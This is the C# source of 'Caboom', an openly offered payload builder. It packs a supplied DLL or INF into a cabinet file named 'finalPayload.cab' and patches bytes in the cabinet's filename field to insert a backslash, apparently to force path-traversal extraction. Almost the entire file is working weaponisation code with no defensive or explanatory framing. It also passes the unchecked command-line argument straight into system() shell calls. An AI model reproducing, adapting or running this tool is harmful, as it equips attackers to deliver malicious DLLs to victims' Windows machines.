using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading.Tasks;

namespace Caboom
{
    class Program
    {
        [DllImport("msvcrt.dll")]
        public static extern int system(string format);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            Console.WriteLine(@"

 ██████╗ █████╗ ██████╗  ██████╗  ██████╗ ███╗   ███╗    ██╗
██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗████╗ ████║    ██║
██║     ███████║██████╔╝██║   ██║██║   ██║██╔████╔██║    ██║
██║     ██╔══██║██╔══██╗██║   ██║██║   ██║██║╚██╔╝██║    ╚═╝
╚██████╗██║  ██║██████╔╝╚██████╔╝╚██████╔╝██║ ╚═╝ ██║    ██╗
 ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝    ╚═╝
                                                            

Created by @mansk1es
");
            Console.WriteLine("\nOnly filetypes .dll and .inf are compatible with this tool.");

            if (args == null || args.Length == 0)
            {
                Console.WriteLine("\nUSAGE: .\\Caboom.exe <dll> OR: .\\Caboom.exe <inf>");
                Console.WriteLine("EXAMPLE: .\\Caboom.exe championship.dll");
                
            }
            else
            {
                string path = Directory.GetCurrentDirectory();
                string curFile = path + "\\CABARC.EXE";

                if (File.Exists(curFile))
                {
                    string argument = args[0];
                    string inf = path + "\\" + args[0];
                    if (File.Exists(inf))
                    {
                        if (Path.GetExtension(inf).Equals(".inf"))
                        {
                            Console.WriteLine(argument + " FOUND!\n Generating your .cab . . .\n");
                            system("move " + argument + " ..");
                            Sleep(2000);
                            system(".\\CABARC.EXE -p -m NONE n ministry.cab ../" + argument);
                            Sleep(1000);
                            Console.WriteLine("CAB CREATED!\n Changing the offset bytes . . .\n");
                            system("copy ministry.cab finalPayload.cab");
                            system("del ministry.cab");
                            string newCabPath = Directory.GetCurrentDirectory() + "\\finalPayload.cab";
                            using (var stream = new FileStream(newCabPath, FileMode.Open, FileAccess.ReadWrite))
                            {
                                stream.Position = 44;
                                stream.WriteByte(0x00);
                                stream.Position = 45;
                                stream.WriteByte(0x5c);
                                stream.Position = 46;
                                stream.WriteByte(0x41);
                                stream.Position = 47;
                                stream.WriteByte(0x00);
                            }
                            Sleep(1000);
                            Console.WriteLine("DONE!");

                        }
                        else if (Path.GetExtension(inf).Equals(".dll"))
                        {
                            Console.WriteLine(argument + " FOUND!\n Generating your .cab . . .\n");
                            string newFile = Path.ChangeExtension(argument, ".inf");
                            system("copy " + argument + " " + newFile);
                            system("move " + newFile + " ..");
                            Sleep(2000);
                            system(".\\CABARC.EXE -p -m NONE n ministry.cab ../" + newFile);
                            Sleep(1000);
                            Console.WriteLine("CAB CREATED!\n Changing the offset bytes . . .\n");
                            system("copy ministry.cab finalPayload.cab");
                            system("del ministry.cab");
                            string newCabPath = Directory.GetCurrentDirectory() + "\\finalPayload.cab";
                            using (var stream = new FileStream(newCabPath, FileMode.Open, FileAccess.ReadWrite))
                            {
                                stream.Position = 44;
                                stream.WriteByte(0x00);
                                stream.Position = 45;
                                stream.WriteByte(0x5c);
                                stream.Position = 46;
                                stream.WriteByte(0x41);
                                stream.Position = 47;
                                stream.WriteByte(0x00);
                            }
                            Sleep(1000);
                            Console.WriteLine("DONE!");
                        }
                    }

                    else
                    {
                        Console.WriteLine(argument + " Not found or not supported. Only .dll OR .inf are allowed!");
                    }

                }
                else
                {
                    Console.WriteLine("CABARC.EXE NOT FOUND.");
                }

            }

        }
    }
}
